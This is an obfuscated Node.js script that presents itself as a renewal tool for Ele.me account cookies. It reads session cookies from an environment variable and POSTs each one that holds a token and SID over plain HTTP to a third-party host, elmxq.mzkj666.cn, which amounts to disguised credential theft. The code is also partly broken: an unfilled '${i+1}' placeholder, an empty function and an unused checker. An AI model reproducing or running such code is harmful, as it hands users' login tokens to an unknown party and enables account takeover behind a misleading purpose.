const OOQQQO = require("axios");
function Q0$O$(Q0Q0Q0Q) {
  try {
    const QQOQQQ = "https://restapi.ele.me/eus/v4/user_mini";
    const $OQQ0$ = {
      'Cookie': Q0Q0Q0Q,
      'User-Agent': "Dalvik/2.1.0 (Linux; U; Android 7.1.2; VOG-AL10 Build/HUAWEIVOG-AL10) liteArticle/8.2.8 tt-ok/3.10.0.2"
    };
    return OOQQQO["get"](QQOQQQ, {
      'headers': $OQQ0$
    })["then"]($0QQQ$ => {
      const $O$$0$ = $0QQQ$["data"];
      return $O$$0$["status"] === 0 ? '【' + $O$$0$["body"]["username"] + '】' : "账号错误或者失效";
    })["catch"](QO0OO0 => {
      return "账号错误或者失效";
    });
  } catch (Q$Q0) {
    return "账号错误或者失效";
  }
}
async function QOQ0OOQ(OQO0QO, O00OQOQ) {
  const Q00QQQ = "http://elmxq.mzkj666.cn/elmxq";
  const Q$Q$Q0 = {
    'Cookie': OQO0QO
  };
  try {
    const QQ0QOQQ = await OOQQQO["post"](Q00QQQ, Q$Q$Q0);
    const Q00$$ = QQ0QOQQ["data"];
    const QQO0Q$ = Q00$$["message"];
    if (QQO0Q$) {
      console["log"]("账号[" + (O00OQOQ + 1) + "]: " + QQO0Q$);
    } else {
      console["log"]("账号[" + (O00OQOQ + 1) + "]: 请求出错!");
    }
  } catch ($OQ0OQ) {
    console["log"]("账号[" + (O00OQOQ + 1) + "]: 请求出错，服务端异常");
  }
}
async function $OQ0QO(O0OQ$0, OOQQ0O) {
  const Q$Q$$O = "http://elmxq.mzkj666.cn/elmxq";
  const QQO0OQ0 = {
    'Cookie': O0OQ$0
  };
  try {} catch ($Q0Q0$) {}
}
async function $$$0() {
  const O0Q$OQ = process["env"]["elmck"];
  const $0$OOO = O0Q$OQ["split"]('&');
  console["log"]("======检测到" + $0$OOO["length"] + "个饿了么cookie======\n");
  for (let O0O0O = 0; O0O0O < $0$OOO["length"]; O0O0O++) {
    console["log"]("========账号" + (O0O0O + 1) + "开始续期========");
    const $QQ0$$ = $0$OOO[O0O0O];
    if ($QQ0$$["includes"]("token=") && $QQ0$$["includes"]("SID=")) {
      await QOQ0OOQ($QQ0$$, O0O0O);
      await new Promise(QO$$QO => setTimeout(QO$$QO, 3000));
    } else {
      if ($QQ0$$["includes"]("SID=")) {
        console["log"]("账号[${i+1}]: 未获取到刷新token，跳过！");
        await $OQ0QO($QQ0$$, O0O0O);
        await new Promise($Q0Q0O => setTimeout($Q0Q0O, 3000));
      } else {
        console["log"]("账号[${i+1}]: cookie错误！");
        await $OQ0QO($QQ0$$, O0O0O);
        await new Promise(OQ0O0Q => setTimeout(OQ0O0Q, 3000));
      }
    }
  }
}
$$$0()["catch"](Q0QO00Q => {
  console["error"](Q0QO00Q);
});
